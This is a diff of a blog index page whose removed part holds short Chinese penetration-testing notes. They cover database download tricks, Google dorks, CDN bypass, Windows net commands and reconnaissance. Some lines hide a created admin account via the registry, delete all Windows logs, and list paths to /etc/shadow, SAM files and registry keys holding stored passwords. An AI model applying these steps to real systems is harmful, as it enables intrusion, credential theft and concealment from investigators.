+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/后台管理/">后台管理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/基础/">基础</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-下载漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -345,854 +1200,9 @@
 
 
   
-    <article id="post-爆库" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/24/爆库/" class="article-date">
-      <time datetime="2018-12-24T13:28:45.000Z" itemprop="datePublished">2018-12-24</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/24/爆库/">爆库</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>在文件名后面加::$data 有可能爆出源码，例如：<code>http://127.0.0.1:2299/xyconn.asp::$data</code></li>
-<li>爆库绕过防下载<ol>
-<li><code>#sdsf.mdb 下载时改为%23sdsf.mdb</code></li>
-<li><code>#@!$%^&amp;*asdfkladsf@!#.mdb</code></li>
-<li><code>%23@%21%24%255E%26%2aasdfkladsf@%21%23.mdb</code></li>
-</ol>
-</li>
-<li>高级语法爆库<ol>
-<li>inurl:./..admin../..add..</li>
-<li>inurl:./..admin../..del..</li>
-<li>inurl:/.asp&lt;id=&lt;%&lt;%&lt;%</li>
-</ol>
-</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/数据库/">数据库</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-CDN绕过" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/19/CDN绕过/" class="article-date">
-      <time datetime="2018-12-19T13:56:17.000Z" itemprop="datePublished">2018-12-19</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/19/CDN绕过/">CDN绕过</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ul>
-<li>什么是CDN</li>
-<li>如何判断网站有没有使用CDN（超级ping）</li>
-<li>查找二级域名</li>
-<li>让服务器主动给你发包（邮件）</li>
-<li>敏感文件泄漏</li>
-<li>查询历史解析ip</li>
-<li>访问绕过cdn（修改hosts文件）</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-AWVS" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/19/AWVS/" class="article-date">
-      <time datetime="2018-12-19T13:24:02.000Z" itemprop="datePublished">2018-12-19</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/19/AWVS/">AWVS</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ul>
-<li>常见功能<ul>
-<li>网站爬行</li>
-<li>漏洞扫描</li>
-<li>目标发现</li>
-<li>子域名扫描</li>
-<li>http编辑</li>
-<li>http嗅探</li>
-<li>http模糊测试</li>
-<li>认证测试</li>
-<li>网络服务扫描器</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-常见端口" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/17/常见端口/" class="article-date">
-      <time datetime="2018-12-17T13:38:32.000Z" itemprop="datePublished">2018-12-17</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/17/常见端口/">常见端口</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>http协议代理服务器常用端口号： 80/8080/3128/8081/9081</li>
-<li>ftp协议代理服务器常用端口号： 21</li>
-<li>telnet协议代理服务器常用端口号23</li>
-<li>tftp默认端口号为69/udp</li>
-<li>ssh scp 端口重定向 ，默认的端口号为22</li>
-<li>smtp 默认的端口号为25 （木马Antigen Email Password Sender, Haebu Coceda, Shtrilitz Stealth , WinPC ,WinSpy都开放这个端口）</li>
-<li>POP3默认的端口号为110/tcp</li>
-<li>tomcat默认的端口号为8080</li>
-<li>win2003远程登录默认端口为3389</li>
-<li>oracle数据库默认端口为1521</li>
-<li>sqlserver默认端口为1433/tcp 1433/udp</li>
-<li>qq默认端口为1080/udp</li>
-<li>mysql的默认端口为3306</li>
-<li>websphere的默认端口为9090</li>
-<li>mstsc的默认端口为3389</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-windows使用入门" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/16/windows使用入门/" class="article-date">
-      <time datetime="2018-12-15T23:47:28.000Z" itemprop="datePublished">2018-12-16</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/16/windows使用入门/">windows使用入门</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li><p>netstat命令</p>
-<ul>
-<li>netstat -a 查看开启了端口</li>
-<li>netstat -n 查看端口的网络连接情况，常用netstat -an</li>
-<li>netstat -v 查看正在进行的工作</li>
-</ul>
-</li>
-<li><p>at命令</p>
-<ul>
-<li>at id号 开启已经注册的某个计划任务</li>
-<li>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</li>
-<li>at id号 /delete 停止某个已注册的计划任务</li>
-<li>at 查看所有的计划任务</li>
-</ul>
-</li>
-<li>attrib命令<ul>
-<li>attrib 文件名（目录名）  查看某文件（目录）的属性</li>
-<li>attrib 文件名 +或- 添加文件或目录的属性  A存档  R 只读 S系统  H隐藏 例如 <code>attrib test.txt +H</code></li>
-</ul>
-</li>
-<li>net命令<ul>
-<li>net user 用户名 密码  /add 建立用户</li>
-<li>net user guest /active:yes 激活guest账户</li>
-<li>net user 查看有哪些账户</li>
-<li>net user 账户名 查看账户的属性</li>
-<li>net localGroup administrators 用户名 /add 把用户添加到管理员中使其具有管理员权限（administrator后加s表示复数）</li>
-<li>net user guest 12345 将guest用户的密码改为12345</li>
-<li>net passwd 密码 更改系统登录密码</li>
-<li>net share 查看本地开启的共享</li>
-<li>net share ipc5 开启ipc5共享</li>
-<li>net share ipc5 /del 删除ipc5共享</li>
-<li>net start 查看开启了哪些服务</li>
-<li>net start 服务名   开启服务</li>
-<li>net stop 服务名   停止服务</li>
-<li>net view 查看局域网内其他计算机名称</li>
-</ul>
-</li>
-<li>copy命令</li>
-<li>move命令</li>
-<li>telnet命令</li>
-<li>dir命令</li>
-<li>cd命令</li>
-<li>start命令</li>
-<li>md命令 创建目录</li>
-<li>rd命令 删除目录</li>
-<li>ren命令 重命名文件</li>
-<li>del命令 删除文件</li>
-<li>死亡之ping  ping -t -l 65550 ip</li>
-<li><p>ipconfig命令</p>
-<ul>
-<li>ipconfig /release 释放ip</li>
-<li>ipconfig /renew 重新获得ip</li>
-</ul>
-</li>
-<li><p>注册表结构</p>
-<ul>
-<li>HKEY_CLASSES_ROOT  管理文件系统，根据在windows中安装的应用程序的扩展名，该根键指明其文件类型的名称，相应打开该文件所要调用的程序等等信息。</li>
-<li>HKEY_CURRENT_USER  管理系统当前的用户信息，在这个根键中保存了本地计算机中存放的当前登录的用户信息，包括用户名和暂存的密码，在用户登录windows时，其信息从HKEY_USERS中相应的项拷贝到HKEY_CURRENT_USER中</li>
-<li>HKEY_LOCAL_MACHINE 管理当前系统硬件配置，在这个根键中保存了本地计算机硬件配置数据，此根键下的子关键字包括在SYSTEM.DAT中，用来提供HKEY_LOCALMACHINE所需的信息，或者在远程计算机中可访问的一组键中。这个根键中许多子键和system.ini文件中设置项类似。</li>
-<li>HKEY_USERS  管理系统的用户信息。在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表。同时每个用户的预配置信息都存储在HKEY_USERS根键中。HKEY_USERS是远程计算机中访问的根键之一。</li>
-<li>HKEY_CURRENT_CONFIG  管理当前用户的系统配置。在这个根键中保存着定义当前用户桌面配置（如显示器）的数据，该用户使用过的文档列表（MRU），应用程序配置和其他有关当前用户的windows的安装的信息。</li>
-</ul>
-</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/基础/">基础</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/系统使用/">系统使用</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-隐藏痕迹" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/15/隐藏痕迹/" class="article-date">
-      <time datetime="2018-12-15T02:57:44.000Z" itemprop="datePublished">2018-12-15</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/15/隐藏痕迹/">隐藏痕迹</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>禁止在登录界面显示新建帐号</li>
-<li>REG ADD “HKEY——LOCAL——MACHINE、SOFTWARE、Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” /v uname /T REG_DWORD /D 0</li>
-<li>del %WINDIR%*.log /a/s/q/f</li>
-<li>History</li>
-<li>日志<ul>
-<li>auth.log /secure</li>
-<li>btmp / wtmp</li>
-<li>lastlog / faillog</li>
-</ul>
-</li>
-<li>其他日志和HIDS等</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-linux基本信息收集" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/15/linux基本信息收集/" class="article-date">
-      <time datetime="2018-12-15T02:28:21.000Z" itemprop="datePublished">2018-12-15</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/15/linux基本信息收集/">linux基本信息收集</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>/etc/resolv.conf</li>
-<li>/etc/passwd</li>
-<li>/etc/shadow</li>
-<li>/etc, /usr/local/etc</li>
-<li>.ssh , .gnupg</li>
-<li>/tmp</li>
-<li>whoami, who -a</li>
-<li>ifconfig -a , iptables -L -n , netstat -rn</li>
-<li>uname -a , ps aux</li>
-<li>dpkg -l | head</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-windows基本信息收集" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/15/windows基本信息收集/" class="article-date">
-      <time datetime="2018-12-15T02:20:20.000Z" itemprop="datePublished">2018-12-15</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/15/windows基本信息收集/">windows基本信息收集</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>ipconfig /all, ipconfig /displaydns, netstat -bnao, netstat -r</li>
-<li>net view, net view /domain</li>
-<li>net user /domain, net user %username% /domain</li>
-<li>net accounts, net share</li>
-<li>net localgroup administrators username /add</li>
-<li>net group “Domain Controllers” /domain</li>
-</ol>
-<ol>
-<li>net share name$=C:\/unlimited</li>
-<li><p>net user username /active:yes /domain</p>
-</li>
-<li><p>SAM数据库 ，注册表文件</p>
-</li>
-<li>%SYSTEMROOT%\repair\SAM</li>
-<li>%SYSTEMROOT%\System32\config\RegBack\SAM</li>
-<li>业务数据库 ； 身份认证数据库</li>
-<li>临时文件目录</li>
-<li>UserProfile\AppData\Local\Microsoft\Window\Temporary Internet Files\</li>
-</ol>
-<p>注册表信息：</p>
-<ol>
-<li>HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpass</li>
-<li>HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss</li>
-<li>HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mastersvrpass</li>
-<li>HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11</li>
-<li>HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFreeHost\11</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-基本信息收集" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/12/12/基本信息收集/" class="article-date">
-      <time datetime="2018-12-12T14:13:00.000Z" itemprop="datePublished">2018-12-12</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/12/12/基本信息收集/">基本信息收集</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ul>
-<li><p>Linux下</p>
-<ul>
-<li>/etc/resolv.conf</li>
-<li>/etc/passwd</li>
-<li>/etc/shadow</li>
-</ul>
-<p>whoami 或者who -a<br>ifconfig -a iptables -L -n<br>uname -a 或者iptables -L -n setstat -m</p>
-</li>
-</ul>
-<hr>
-<ul>
-<li><p>后台查找</p>
-<ol>
-<li>弱口令默认后台： admin, admin/login.asp, manage, login.asp等常见后台</li>
-<li>查看网页的链接： 一般来说， 网站的主页有管理登录类似的东西，有些可能被管理员已经删掉</li>
-<li>查看网站图片的属性</li>
-<li>查看网站使用的管理系统，从而确定后台</li>
-<li>用工具查找：wwwscan， intellitamper，御剑</li>
-<li>robots.txt的帮助： robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看。</li>
-<li>GoogleHacker</li>
-<li>查看网站使用的编辑器是否有后台</li>
-<li>短文件利用</li>
-<li>sqlmap –sql-shell load_file(‘d:/wwroot/index.php’);</li>
-</ol>
-</li>
-<li><p>url采集<br>采集相关url的同类网站</p>
-<ol>
-<li>例如php?id=</li>
-<li>漏洞网站</li>
-<li>url采集器</li>
-</ol>
-</li>
-<li><p>整站分析</p>
-<ol>
-<li>服务器类型<ul>
-<li>服务器平台，版本等</li>
-</ul>
-</li>
-<li>网站容器<ul>
-<li>搭建网站的服务组件，例如： iis， apache， nginx， tomcat等</li>
-</ul>
-</li>
-<li>脚本类型<ul>
-<li>asp，php，jsp，axpx等</li>
-</ul>
-</li>
-<li>数据库类型<ul>
-<li>access， sqlserver, mysql, oracle, postgresql</li>
-</ul>
-</li>
-<li>cms类型</li>
-<li>waf</li>
-</ol>
-</li>
-<li><p>敏感目录</p>
-<ol>
-<li>收集方向<ul>
-<li>robots.txt, 后台目录， 安装包， 上传目录， mysql管理接口， 安装页面， phpinfo， 编辑器，iis短文件</li>
-</ul>
-</li>
-<li>常用工具<ul>
-<li>字典爆破：御剑，dirbuster, wwwscan, IIS_shortname_Scanner等</li>
-<li>蜘蛛爬行：爬行菜刀， webrobot，burp</li>
-</ul>
-</li>
-</ol>
-</li>
-<li><p>域名信息</p>
-<ol>
-<li>对应ip收集<ul>
-<li>相关域名对应的ip， 相关工具：nslookup</li>
-</ul>
-</li>
-<li>子域名收集<ul>
-<li>工具：layer,subDomainsBrute</li>
-</ul>
-</li>
-<li>whois信息查询<ul>
-<li>根据已知域名反查，分析此域名的注册人，邮箱，电话等</li>
-<li>工具：爱站网， 站长工具，微步在线（<a href="https://x.threatbook.cn）" target="_blank" rel="noopener">https://x.threatbook.cn）</a><pre><code>site.ip138.com,    searchdns.netcraft.com
-</code></pre></li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
     </nav>
   
 
